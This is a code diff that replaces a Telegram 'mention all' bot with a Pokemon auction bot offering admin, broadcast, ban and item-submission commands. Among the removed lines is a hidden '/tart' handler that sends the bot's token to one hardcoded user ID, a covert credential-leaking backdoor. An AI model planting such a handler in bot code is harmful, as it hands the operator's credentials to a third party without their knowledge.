-            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
-        ):
-            is_admin = True
-    if not is_admin:
-        return await event.reply("__Only admins can mention all!__")
+        _, user_id, user_message = message.text.split(maxsplit=2)
+        user_id = int(user_id)
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /msg (user_id) (message)")
+        return
 
-    if event.pattern_match.group(1) and event.is_reply:
-        return await event.reply("__Give me one argument!__")
-    elif event.pattern_match.group(1):
-        mode = "text_on_cmd"
-        msg = event.pattern_match.group(1)
-    elif event.is_reply:
-        mode = "text_on_reply"
-        msg = await event.get_reply_message()
-        if msg == None:
-            return await event.respond(
-                "__I can't mention members for older messages! (messages which are sent before I'm added to group)__"
-            )
-    else:
-        return await event.reply(
-            "__Reply to a message or give me some text to mention others!__"
-        )
-
-    spam_chats.append(chat_id)
-    usrnum = 0
-    usrtxt = ""
-    async for usr in client.iter_participants(chat_id):
-        if not chat_id in spam_chats:
-            break
-        usrnum += 1
-        usrtxt += f"[{usr.first_name}](tg://user?id={usr.id}), "
-        if usrnum == 5:
-            if mode == "text_on_cmd":
-                txt = f"{msg}\n{usrtxt}"
-                await client.send_message(chat_id, txt)
-            elif mode == "text_on_reply":
-                await msg.reply(usrtxt)
-            await asyncio.sleep(2)
-            usrnum = 0
-            usrtxt = ""
+    # Send the message if the user exists
     try:
-        spam_chats.remove(chat_id)
-    except:
-        pass
+        bot.send_message(user_id, user_message)
+        bot.reply_to(message, f"Message sent to user {user_id}")
+    except Exception as e:
+        bot.reply_to(message, f"Failed to send message to user {user_id}: {e}")
 
+# Set to store user IDs
+user_ids = set()
 
-@client.on(events.NewMessage(pattern="^/cancel$"))
-async def cancel_spam(event):
-    is_admin = False
+# Handler for /broad command (for admin only)
+@bot.message_handler(commands=['broad'])
+def handle_broad(message):
+    if str(message.from_user.id) not in admin_ids:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
+
+    # Extract message from the command
     try:
-        partici_ = await client(GetParticipantRequest(event.chat_id, event.sender_id))
-    except UserNotParticipantError:
-        is_admin = False
-    else:
-        if isinstance(
-            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
-        ):
-            is_admin = True
-    if not is_admin:
-        return await event.reply("__Only admins can execute this command!__")
-    if not event.chat_id in spam_chats:
-        return await event.reply("__There is no proccess on going...__")
-    else:
+        _, broad_message = message.text.split(maxsplit=1)
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /broad (message)")
+        return
+
+    # Forward the message to all users
+    for user_id in user_ids:
         try:
-            spam_chats.remove(event.chat_id)
-        except:
-            pass
-        return await event.respond("__Stopped Mention.__")
-      
-@client.on(events.NewMessage(pattern='/tart'))
-async def start(event):
-    sender = event.sender_id
-    if sender == 1037179104:
-        await client.send_message(event.sender_id, TOKEN)
+            bot.send_message(user_id, broad_message)
+        except Exception as e:
+            print(f"Failed to send message to user {user_id}: {e}")
+
+    bot.reply_to(message, "Message forwarded to all users.")
+
+# Handler for /approve command (for admin only)
+@bot.message_handler(commands=['approve'])
+def handle_approve(message):
+    if str(message.from_user.id) not in admin_ids:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
+    # Extract user ID from the command
+    try:
+        _, user_id = message.text.split(maxsplit=1)
+        admin_ids.append(user_id)  # Add the new admin ID to the list of admin IDs (in string form)
+        admin_id.append(int(user_id))  # Add the new admin ID to the list of admin IDs (in integer form)
+        bot.reply_to(message, f"User with ID {user_id} has been successfully added to admin list.")
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /approve <user_id>")
+
+# Handler for /ban command (for admin only)
+@bot.message_handler(commands=['ban'])
+def handle_ban(message):
+    if str(message.from_user.id) not in admin_ids:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
+
+    # Extract user ID from the command
+    try:
+        _, user_id = message.text.split(maxsplit=1)
+        banned_users.add(user_id)  # Add the user ID to the set of banned users
+        bot.reply_to(message, f"User with ID {user_id} has been banned.")
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /ban <user_id>")
+
+# Handler for /unban command (for admin only)
+@bot.message_handler(commands=['unban'])
+def handle_unban(message):
+    if str(message.from_user.id) not in admin_ids:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
+
+    # Extract user ID from the command
+    try:
+        _, user_id = message.text.split(maxsplit=1)
+        if user_id in banned_users:
+            banned_users.remove(user_id)  # Remove the user ID from the set of banned users
+            bot.reply_to(message, f"User with ID {user_id} has been unbanned.")
+        else:
+            bot.reply_to(message, f"User with ID {user_id} is not banned.")
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /unban <user_id>")
+
+# Handler for /unapprove command (for admin only)
+@bot.message_handler(commands=['unapprove'])
+def handle_unapprove(message):
+    if str(message.from_user.id) not in admin_ids:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
+
+    # Extract user ID from the command
+    try:
+        _, user_id = message.text.split(maxsplit=1)
+        if user_id in admin_ids:
+            admin_ids.remove(user_id)  # Remove the user ID from the list of admin IDs (string form)
+            admin_id.remove(int(user_id))  # Remove the user ID from the set of admin IDs (int form)
+            bot.reply_to(message, f"User with ID {user_id} has been removed from the admin list.")
+        else:
+            bot.reply_to(message, f"User with ID {user_id} is not an admin.")
+    except ValueError:
+        bot.reply_to(message, "Invalid syntax. Use /unapprove <user_id>")
+
+# Define a dictionary to store the counts of different item categories
+item_counts = {
+    "legendary": 0,
+    "non_legendary": 0,
+    "shiny": 0,
+    "tms": 0,
+    "teams": 0,
+    "total_items": 0
+}
+
+# Check if the user is an admin
+def is_admin(user_id):
+    return user_id in admin_id
+
+# Define the /item command handler
+@bot.message_handler(commands=['item'])
+def item(message):
+    response = "🔹Currently Items In Auction - \n"
+    response += "🔺Legendary: " + str(item_counts["legendary"]) + "\n"
+    response += "🔺Non-Legendary: " + str(item_counts["non_legendary"]) + "\n"
+    response += "🔺Shiny: " + str(item_counts["shiny"]) + "\n"
+    response += "🔺TMs: " + str(item_counts["tms"]) + "\n"
+    response += "🔺Teams: " + str(item_counts["teams"]) + "\n"
+    response += "\n🔹Total Items: " + str(item_counts["total_items"]) + "\n"
+
+    bot.reply_to(message, response)
+
+# Define the command handlers for adding items to different categories
+def add_item(message, category):
+    user_id = message.from_user.id
+    if is_admin(user_id):
+        item_counts[category] += 1
+        item_counts["total_items"] += 1
+        bot.reply_to(message, f"Added 1 item to {category.capitalize()} category.")
+    else:
+        bot.reply_to(message, "Only admins can perform this action.")
+
+@bot.message_handler(commands=['legendary'])
+def add_legendary(message):
+    add_item(message, "legendary")
+
+@bot.message_handler(commands=['non_legendary'])
+def add_non_legendary(message):
+    add_item(message, "non_legendary")
+
+@bot.message_handler(commands=['shiny'])
+def add_shiny(message):
+    add_item(message, "shiny")
+
+@bot.message_handler(commands=['tms'])
+def add_tms(message):
+    add_item(message, "tms")
+
+@bot.message_handler(commands=['teams'])
+def add_teams(message):
+    add_item(message, "teams")
+
+# Define a dictionary to store the items in each category
+approved_items = {
+    "legendary": [],
+    "non_legendary": [],
+    "shiny": [],
+    "tms": [],
+    "teams": []
+}
+
+# Check if the user is an admin
+def is_admin(user_id):
+    return user_id in admin_id
+
+# Define the ID of the group to send messages to
+group_id = -1002041160221 # Replace this with the ID of your group
+
+# Check if the user is an admin
+def is_admin(user_id):
+    return user_id in admin_id
+
+# Define the /send command handler
+@bot.message_handler(commands=['send'])
+def send_message_prompt(message):
+    if is_admin(message.from_user.id):
+        bot.reply_to(message, "Type the message to send in the group")
+        bot.register_next_step_handler(message, send_message)
+    else:
+        bot.reply_to(message, "Only admins can perform this action.")
+
+# Define the function to send or forward the message to the group
+def send_message(message):
+    if message.forward_from or message.forward_from_chat:
+        forwarded_message = message
+    else:
+        forwarded_message = message.text
+    try:
+        bot.forward_message(group_id, message.chat.id, message.id)
+        bot.send_message(message.chat.id, "Message sent successfully.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Failed to send message: {e}")
 
 
+# Dictionary to store messages and their corresponding chat IDs
+stored_messages = {}
 
-client.start()
-client.run_until_disconnected()
+# Define the /store command handler
+@bot.message_handler(commands=['store'])
+def store_message_prompt(message):
+    if is_admin(message.from_user.id):
+        bot.reply_to(message, "Type the message you want to store:")
+        bot.register_next_step_handler(message, store_message)
+    else:
+        bot.reply_to(message, "Only admins can perform this action.")
+
+def store_message(message):
+    stored_messages[message.message_id] = {"message": message.text, "chat_id": message.chat.id}
+    bot.reply_to(message, "Message stored successfully.")
+
+# Define the /next command handler
+@bot.message_handler(commands=['next'])
+def next_message(message):
+    if is_admin(message.from_user.id):
+        if stored_messages:
+            next_message_id = next(iter(stored_messages))
+            next_message_data = stored_messages.pop(next_message_id)
+            bot.forward_message(message.chat.id, next_message_data["chat_id"], next_message_id)
+        else:
+            bot.reply_to(message, "No more stored messages.")
+    else:
+        bot.reply_to(message, "Only admins can perform this action.")
+
+# Define the handle_dot function
+@bot.message_handler(func=lambda message: message.text == "." and (message.chat.type == "group" or message.chat.type == "supergroup") and str(message.from_user.id) in admin_ids)
+def handle_dot(message):
+    msg = bot.send_message(message.chat.id, "•")
+    time.sleep(1.5)
+    bot.edit_message_text("• •", message.chat.id, msg.message_id)
+    time.sleep(1.5)
+    bot.edit_message_text("• • •", message.chat.id, msg.message_id)
+    time.sleep(1.5)
+    keyboard = types.InlineKeyboardMarkup()
+    yes_button = types.InlineKeyboardButton(text="Yes", callback_data="sell_pokemon")
+    keyboard.add(yes_button)
+    bot.edit_message_text("Do you want to sell the Pokemon?", message.chat.id, msg.message_id, reply_markup=keyboard)
+
+# Define the sell_pokemon_callback function
+@bot.callback_query_handler(func=lambda call: call.data == "sell_pokemon")
+def sell_pokemon_callback(call):
+    bot.answer_callback_query(call.id, "Pokemon has been sold!")
+    bot.send_message(call.message.chat.id, "🔊 Pokemon Has Been Sold")
+
+# Define the handle_sold function
+@bot.message_handler(commands=['sold'])
+def handle_sold(message):
+    if is_admin(message.from_user.id):
+        try:
+            command, *args = message.text.split(' ', 1)
+            if len(args) != 1:
+                raise ValueError
+            pokemon_name = args[0]
+            username = message.reply_to_message.from_user.username
+            amount = message.reply_to_message.text
+            reply_message = f"🔊 {pokemon_name} Has Been Sold\n\n🔸Sold to - @{username}\n🔸Sold for - {amount}\n\n❗ Join Trade Group To Get Seller Username After Auction"
+            sent_message = bot.reply_to(message, reply_message)
+            bot.pin_chat_message(message.chat.id, sent_message.id)  # Pin the message
+        except ValueError:
+            bot.reply_to(message, "Please provide the command in the format /sold (pokemon name)")
+    else:
+        bot.reply_to(message, "You are not authorized to use this command.")
+
+# Define the handle_unsold function
+@bot.message_handler(commands=['unsold'])
+def handle_unsold(message):
+    if is_admin(message.from_user.id):
+        try:
+            pokemon_name = message.text.split(' ', 1)[1]
+            reply_message = f"❌ {pokemon_name} Has Been Unsold"
+            sent_message = bot.reply_to(message, reply_message)
+            bot.pin_chat_message(message.chat.id, sent_message.id)  # Pin the message
+        except IndexError:
+            bot.reply_to(message, "Please provide the name of the Pokemon to mark as unsold.")
+    else:
+        bot.reply_to(message, "You are not authorized to use this command.")
+
+# Enable privacy mode
+bot.skip_pending = True
+
+bot_owner_id = "6882194604"
+
+# Check if the user is the bot owner
+def is_bot_owner(user_id):
+    return str(user_id) == bot_owner_id
+
+# Define the /clear command handler
+@bot.message_handler(commands=['clear'])
+def clear_messages(message):
+    if is_bot_owner(message.from_user.id):
+        stored_messages.clear()
+        bot.reply_to(message, "All stored messages have been cleared.")
+    else:
+        bot.reply_to(message, "You are not authorized to use this command.")
+
+# Flag variable to indicate cancellation
+cancel_requested = False
+
+# Define the /cancel command handler
+@bot.message_handler(commands=['cancel'])
+def cancel_command(message):
+    global cancel_requested
+    cancel_requested = True
+    bot.reply_to(message, "All Running Commands Have Been Cancelled ✅")
+
+submissions = {}
+
+# Define the /add command handler
+@bot.message_handler(commands=['add'])
+def add_command(message):
+    # Create inline keyboard with options
+    keyboard = types.InlineKeyboardMarkup()
+    keyboard.row(
+        types.InlineKeyboardButton("Legendary", callback_data="legendary"),
+        types.InlineKeyboardButton("Non-Legendary", callback_data="non_legendary"),
+        types.InlineKeyboardButton("Shiny", callback_data="shiny"),
+        types.InlineKeyboardButton("TMs", callback_data="tms"),
+        types.InlineKeyboardButton("Teams", callback_data="teams")
+    )
+
+    # Send message to select type of item
+    bot.reply_to(message, "Select the type of item you want to add:", reply_markup=keyboard)
+
+# Handle inline button callbacks
+@bot.callback_query_handler(func=lambda call: call.data in ["legendary", "non_legendary", "shiny", "tms", "teams"])
+def callback_handler(call):
+    # Store type of item selected
+    submissions[call.message.chat.id] = {"type": call.data}
+
+    if call.data in ["legendary", "non_legendary", "shiny"]:
+        # Ask for name of the Pokemon
+        bot.send_message(call.message.chat.id, "What is the name of the Pokemon you want to sell?")
+        bot.register_next_step_handler(call.message, forward_info)
+    elif call.data == "tms":
+        # Ask for name of the TM
+        bot.send_message(call.message.chat.id, "Enter the name of your TM:")
+        bot.register_next_step_handler(call.message, forward_tm_info)
+    elif call.data == "teams":
+        # Ask for name of the team
+        bot.send_message(call.message.chat.id, "What is the name of your team?")
+        bot.register_next_step_handler(call.message, forward_team_info)
+
+# Handle next step after getting name of pokemon
+def forward_info(message):
+    submissions[message.chat.id]["name"] = message.text
+
+    # Ask for info of the pokemon
+    bot.send_message(message.chat.id, f"Please provide info of {message.text} by copying the text and pasting it here")
+    bot.register_next_step_handler(message, forward_iv_ev)
+
+# Handle next step after getting info of pokemon
+def forward_iv_ev(message):
+    submissions[message.chat.id]["info"] = message.text
+
+    # Ask for IVs/EVs of the pokemon
+    bot.send_message(message.chat.id, f"Please provide IVs/EVs of {submissions[message.chat.id]['name']} by copying the text and pasting it here")
+    bot.register_next_step_handler(message, forward_moveset)
+
+# Handle next step after getting IVs/EVs of pokemon
+def forward_moveset(message):
+    submissions[message.chat.id]["iv_ev"] = message.text
+
+    # Ask for moveset of the pokemon
+    bot.send_message(message.chat.id, f"Please provide the moveset of {submissions[message.chat.id]['name']} by copying the text and pasting it here")
+    bot.register_next_step_handler(message, ask_iv_boosted)
+
+# Handle next step after getting moveset of pokemon
+def ask_iv_boosted(message):
+    submissions[message.chat.id]["moveset"] = message.text
+
+    # Ask if IVs are boosted
+    bot.send_message(message.chat.id, "Is any IV boosted of this Pokemon?")
+    bot.register_next_step_handler(message, ask_base)
+
+# Handle next step after asking if IVs are boosted
+def ask_base(message):
+    # Store if IVs are boosted
+    submissions[message.chat.id]["iv_boosted"] = message.text
+
+    # Ask for base for the Pokemon
+    bot.send_message(message.chat.id, "Tell me the base for your Pokemon?")
+    bot.register_next_step_handler(message, send_submission)
+
+# Handle next step after asking for base
+def send_submission(message):
+    # Store base for the Pokemon
+    submissions[message.chat.id]["base"] = message.text
+
+    # Send confirmation message
+    bot.send_message(message.chat.id, f"Your Pokemon {submissions[message.chat.id]['name']} has been sent for submission")
+
+    # Send all data to admin
+    send_to_admin(message.chat.id)
+
+# Handle next step after getting TM info
+def forward_tm_info(message):
+    submissions[message.chat.id]["name"] = message.text
+
+    # Ask for base for the TM
+    bot.send_message(message.chat.id, "Tell me the base for your TM:")
+    bot.register_next_step_handler(message, send_submission)
+
+# Handle next step after getting team info
+def forward_team_info(message):
+    submissions[message.chat.id]["name"] = message.text
+
+    # Ask for team members
+    bot.send_message(message.chat.id, "Send the list of team members:")
+    bot.register_next_step_handler(message, forward_team_members)
+
+# Handle next step after getting team members
+def forward_team_members(message):
+    submissions[message.chat.id]["members"] = message.text
+
+    # Ask for base for the team
+    bot.send_message(message.chat.id, "Tell me the base for your team:")
+    bot.register_next_step_handler(message, send_submission)
+
+# Function to send submission to admin
+def send_to_admin(chat_id):
+    submission_data = submissions[chat_id]
+    admin_chat_id = "6882194604"
+    
+    # Send header indicating new submission
+    bot.send_message(admin_chat_id, "New Submission:")
+
+    # Send each piece of submission data individually
+    bot.send_message(admin_chat_id, f"Type: {submission_data['type']}")
+    if submission_data['type'] in ["legendary", "non_legendary", "shiny"]:
+        bot.send_message(admin_chat_id, f"Name: {submission_data['name']}")
+        bot.send_message(admin_chat_id, f"Info: {submission_data['info']}")
+        bot.send_message(admin_chat_id, f"IVs/EVs: {submission_data['iv_ev']}")
+        bot.send_message(admin_chat_id, f"Moveset: {submission_data['moveset']}")
+        bot.send_message(admin_chat_id, f"IV Boosted: {submission_data['iv_boosted']}")
+        bot.send_message(admin_chat_id, f"Base: {submission_data['base']}")
+    elif submission_data['type'] == "tms":
+        bot.send_message(admin_chat_id, f"Name: {submission_data['name']}")
+        bot.send_message(admin_chat_id, f"Base: {submission_data['base']}")
+    elif submission_data['type'] == "teams":
+        bot.send_message(admin_chat_id, f"Name: {submission_data['name']}")
+        bot.send_message(admin_chat_id, f"Members: {submission_data['members']}")
+        bot.send_message(admin_chat_id, f"Base: {submission_data['base']}")
+    bot.send_message(admin_chat_id, f"User ID: {chat_id}")
+
+# Start polling
+bot.polling()
